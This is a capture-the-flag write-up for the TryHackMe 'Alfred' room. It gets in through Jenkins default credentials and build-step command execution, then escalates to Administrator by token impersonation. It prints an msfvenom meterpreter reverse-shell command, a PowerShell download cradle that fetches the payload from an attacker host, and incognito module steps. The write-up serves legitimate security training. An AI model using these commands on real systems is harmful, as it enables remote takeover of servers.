# TryHackMe - Alfred
---

## Enum
Initially, when enumerating for open ports we can see that the ports 80, 8080 and 3389 are open. 
On port 8080 we can see that there's an automation server running which is called "Jenkins" (https://www.jenkins.io/).

## Weak creds
This sever has a login page on the index page:
![]((https://github.com/MarkSeliter/Writeups/img/'Pasted image 20210827190250.png'))

The credentials are: `admin:admin` 

# Exploiting Jenkins
When enumerating the server, I notice that I can run commands to the server by entering them to the projects and running the project.
The process for runnign commands on the server is as follows: Jenkins -> project -> Configure -> "Build" tab -> enter command -> apply/ save -> Build Now.
![](/img/Pasted image 20210827190250.png)

# Initial access
I generated a meterpreter payload and transfered it to the server using powershell.
msfvenom:
```txt
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -a x86 lhost=10.10.218.77 lport=4444 -f exe -o met.exe
```
powershell download:
```txt
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.218.77:8888/met.exe', 'C:\Program Files (x86)\Jenkins\workspace\project\met.exe')"
```

![](/img/Pasted image 20210828114210.png)

Then just running "met.exe" using the same misconfiguration.

# User flag
![](/img/Pasted image 20210828115051.png)

# PrivEsc
When running whoami /priv we can see that we have some interesting priviliges like debug and SetImpersonate:
![](/img/Pasted image 20210828115240.png)

We'll be using the "incognito" module from metasploit in order to leverage this.
`meterpreter> load incognito`

Then we list what tokens we can impersonate:
`list_tokens -u/-g`

In this case we see that we can impersonate `BUILTIN\Administrators`. So we'll impersonate that token:
![](img/Pasted image 20210828115908.png)
(if shell commands dont work then migrate to a system process).

# Root flag
![](/img/Pasted image 20210828120047.png)
